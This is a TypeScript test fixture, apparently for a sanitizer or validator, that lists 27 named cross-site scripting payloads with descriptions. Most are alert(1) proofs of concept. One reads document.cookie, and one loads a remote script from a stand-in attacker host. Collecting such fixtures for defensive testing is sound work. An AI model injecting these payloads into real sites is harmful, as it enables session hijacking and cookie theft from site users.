export interface XSSVectorFixture {
  id: string;
  name: string;
  vector: string;
  description: string;
}

export const xssVectorFixtures: XSSVectorFixture[] = [
  {
    id: 'xss-01',
    name: 'Basic Script Tag',
    vector: '<script>alert(1)</script>',
    description: 'Standard inline script tag injection',
  },
  {
    id: 'xss-02',
    name: 'Uppercase Script Tag',
    vector: '<SCRIPT>alert("XSS")</SCRIPT>',
    description: 'Uppercase script tag evasion attempt',
  },
  {
    id: 'xss-03',
    name: 'Whitespace Padded Script Tag',
    vector: '<scr ipt>alert(1)</scr ipt>',
    description: 'Whitespace inserted inside script tag name',
  },
  {
    id: 'xss-04',
    name: 'Image OnError Attribute',
    vector: '<img src=x onerror=alert(1)>',
    description: 'HTML image tag with event handler attribute',
  },
  {
    id: 'xss-05',
    name: 'SVG OnLoad Attribute',
    vector: '<svg/onload=alert(1)>',
    description: 'SVG element with inline onload event',
  },
  {
    id: 'xss-06',
    name: 'IFrame JavaScript URI',
    vector: '<iframe src="javascript:alert(1)"></iframe>',
    description: 'Iframe element with javascript pseudoprotocol src',
  },
  {
    id: 'xss-07',
    name: 'Body OnLoad Attribute',
    vector: '<body onload=alert(1)>',
    description: 'Body tag event handler injection',
  },
  {
    id: 'xss-08',
    name: 'Input OnFocus Autofocus',
    vector: '<input onfocus=alert(1) autofocus>',
    description: 'Input autofocus event handler payload',
  },
  {
    id: 'xss-09',
    name: 'Anchor JavaScript URI',
    vector: '<a href="javascript:alert(1)">Click here</a>',
    description: 'Hyperlink href with javascript pseudoprotocol',
  },
  {
    id: 'xss-10',
    name: 'Quote Breakout OnFocus',
    vector: '" autofocus onfocus=alert(1) x="',
    description: 'Double quote attribute breakout payload',
  },
  {
    id: 'xss-11',
    name: 'Single Quote Breakout Script',
    vector: "}'><script>alert(document.cookie)</script>",
    description: 'Single quote breakout with script tag',
  },
  {
    id: 'xss-12',
    name: 'Details Element OnError',
    vector: '<details open onerror=alert(1)>',
    description: 'HTML5 details element event handler payload',
  },
  {
    id: 'xss-13',
    name: 'MathML Vector',
    vector: '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">',
    description: 'MathML tag payload with XLink javascript URI',
  },
  {
    id: 'xss-14',
    name: 'Object Base64 Data URI',
    vector: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    description: 'HTML object element with base64 data URI',
  },
  {
    id: 'xss-15',
    name: 'Embed JavaScript URI',
    vector: '<embed src="javascript:alert(1)">',
    description: 'Embed element with javascript pseudoprotocol',
  },
  {
    id: 'xss-16',
    name: 'Style Tag Import JavaScript',
    vector: "<style>@import 'javascript:alert(1)';</style>",
    description: 'Style block CSS import javascript URI payload',
  },
  {
    id: 'xss-17',
    name: 'Link Import Data URI',
    vector: '<link rel="import" href="data:text/html;<script>alert(1)</script>">',
    description: 'Link element HTML import with data URI payload',
  },
  {
    id: 'xss-18',
    name: 'Meta Refresh JavaScript URI',
    vector: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    description: 'Meta refresh header redirect with javascript URI',
  },
  {
    id: 'xss-19',
    name: 'Closing Tag Escape Polyglot',
    vector:
      'javascript:/*--></title></style></script></textarea></noscript></option></template></script><script>alert(1)</script>',
    description: 'XSS polyglot payload breaking out of multiple tag context boundaries',
  },
  {
    id: 'xss-20',
    name: 'Form Action JavaScript URI',
    vector: '<form action="javascript:alert(1)"><input type=submit>',
    description: 'Form submission action with javascript pseudoprotocol',
  },
  {
    id: 'xss-21',
    name: 'Marquee OnStart Event',
    vector: '<marquee onstart=alert(1)>',
    description: 'Marquee tag onstart event handler payload',
  },
  {
    id: 'xss-22',
    name: 'Video OnError Event',
    vector: '<video src=x onerror=alert(1)>',
    description: 'HTML5 video element event handler payload',
  },
  {
    id: 'xss-23',
    name: 'Audio OnError Event',
    vector: '<audio src=x onerror=alert(1)>',
    description: 'HTML5 audio element event handler payload',
  },
  {
    id: 'xss-24',
    name: 'Base Tag Href Evasion',
    vector: '<base href="javascript:alert(1)//">',
    description: 'Base element href override payload',
  },
  {
    id: 'xss-25',
    name: 'Table Background JavaScript',
    vector: '<table background="javascript:alert(1)">',
    description: 'Table background attribute payload',
  },
  {
    id: 'xss-26',
    name: 'Nested Script Tag Evasion',
    vector: '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    description: 'Nested script tag obfuscation payload',
  },
  {
    id: 'xss-27',
    name: 'External Script Tag Source',
    vector: '<script src="http://attacker.com/xss.js"></script>',
    description: 'External script resource injection payload',
  },
];
